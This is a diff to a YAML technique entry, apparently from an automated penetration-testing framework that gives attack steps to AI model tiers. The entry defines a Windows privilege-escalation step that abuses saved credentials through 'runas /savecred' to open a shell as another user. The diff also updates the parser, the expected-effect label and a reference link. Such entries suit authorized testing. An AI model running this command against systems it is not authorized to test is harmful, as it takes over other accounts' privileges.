@@ -2,15 +2,19 @@ name: runas_savecred
 category: privesc
 description: Windows RunAs with saved credentials
 preconditions:
-  - os==windows
+- os==windows
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "runas /savecred /user:{domain}\{username} cmd.exe"
-parser: null
+command_template: 'runas /savecred /user:{domain}\{username} cmd.exe
+
+  '
+parser: generic_parser
 expected_effects:
-  - action_completed
+- savecred_abused
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "If credentials are saved in Credential Manager (cmdkey /list shows entries), runas /savecred uses them without password prompt. Common for service accounts."
+mechanism: If credentials are saved in Credential Manager (cmdkey /list shows entries),
+  runas /savecred uses them without password prompt. Common for service accounts.
+hacktricks_ref: windows-hardening/basic-powershell-for-pentesters/powerview.md
